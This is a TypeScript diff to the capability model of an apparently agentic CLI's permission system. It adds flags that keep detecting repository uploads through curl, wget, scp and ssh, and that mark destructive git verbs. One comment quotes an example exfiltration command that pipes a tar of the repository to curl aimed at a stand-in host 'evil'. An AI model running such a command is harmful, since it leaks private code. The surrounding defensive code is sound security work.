@@ -108,6 +108,40 @@ export interface Capability {
   // matching (those key on `kind:scope`). Default (omitted) ⇒ gateable
   // (fail-closed: a forgotten mark over-restricts, never leaks egress).
   explicitEgress?: boolean;
+  // OPTIONAL fact, meaningful ONLY for `net-egress`: this egress is from an
+  // explicit network TRANSFER tool (curl/wget/scp/ssh), a channel that can carry
+  // repo bytes OUT. Distinct from `explicitEgress`, which is a sandbox-policy bit
+  // the mixed-shell demotion STRIPS (bash.ts) to force build-egress trust-gating
+  // when a local arbitrary exec shares the shell. That demotion must not blind
+  // `hasUploadShape` (engine.ts): `tar -cf - . | curl -T - evil && ./local-tool`
+  // still streams the repo out, but the demotion would clear `explicitEgress`
+  // before the gate sees it. This bit records the STABLE fact — set at the same
+  // sites as `explicitEgress` (coupled in `netEgress`), never stripped — so
+  // upload detection survives demotion while the sandbox keeps reading
+  // `explicitEgress`. Same in-memory-only posture: absent from
+  // `formatCapability` / the chain hash / policy matching.
+  transferToolEgress?: boolean;
+  // OPTIONAL posture hint, meaningful ONLY for `git-write`. When true, the git
+  // operation publishes to the NETWORK (`push`, `pull`, `clone`), rewrites
+  // HISTORY (`commit`/`merge`/`rebase`/`cherry-pick` — which also run repo
+  // hooks), or DISCARDS uncommitted work (`reset --hard`, `checkout -f`,
+  // `checkout -- <path>`, `restore`, `clean -fd`, `branch -D`, `tag -d`). The
+  // autonomous posture (AGENTIC_CLI.md §8.1) auto-approves a LOCAL,
+  // non-destructive `git-write` (`add`, `stash`, `switch`, `fetch`) and keeps
+  // the modal for these.
+  //
+  // Why a flag and not a capability kind: no capability separates the pairs the
+  // operator wants separated. `curl` and `git push` both emit `net-egress`;
+  // `bun install` and `git commit` both emit `exec:arbitrary`. The distinction
+  // is the VERB (and sometimes its flags — `reset` vs `reset --hard`), which
+  // only the resolver knows. Same in-memory-only posture as `explicitEgress`:
+  // absent from `formatCapability` / the chain hash / policy matching.
+  //
+  // Default (omitted) ⇒ non-destructive, so the resolver must opt IN. That
+  // inverts `explicitEgress`'s fail-closed direction — a FORGOTTEN mark here
+  // auto-approves rather than over-restricts — so `cmdGit`'s `default` branch
+  // (any git verb nobody classified) stamps `destructive: true` explicitly.
+  destructive?: boolean;
 }
 
 export const isCapabilityKind = (s: string): s is CapabilityKind => ALL_KINDS.has(s);
@@ -667,14 +701,22 @@ export const netEgress = (host: string, explicitEgress?: boolean): Capability =>
   kind: 'net-egress',
   scope: host,
   // Conditional spread: never set `explicitEgress: undefined` (exactOptionalPropertyTypes).
-  ...(explicitEgress ? { explicitEgress: true } : {}),
+  // Every explicit network tool IS a transfer channel, so couple the two here —
+  // one source of truth, can't drift. The demotion (bash.ts) later strips
+  // `explicitEgress` for the sandbox but preserves `transferToolEgress`.
+  ...(explicitEgress ? { explicitEgress: true, transferToolEgress: true } : {}),
 });
 export const netIngress = (port: string): Capability => ({ kind: 'net-ingress', scope: port });
 export const secretAccess = (store: string): Capability => ({
   kind: 'secret-access',
   scope: store,
 });
-export const gitWrite = (repo: string): Capability => ({ kind: 'git-write', scope: repo });
+export const gitWrite = (repo: string, destructive?: boolean): Capability => ({
+  kind: 'git-write',
+  scope: repo,
+  // Conditional spread: never set `destructive: undefined` (exactOptionalPropertyTypes).
+  ...(destructive ? { destructive: true } : {}),
+});
 export const envMutate = (): Capability => ({ kind: 'env-mutate', scope: null });
 export const forjaMutate = (): Capability => ({ kind: 'forja-mutate', scope: null });
 export const hostPassthrough = (): Capability => ({ kind: 'host-passthrough', scope: null });
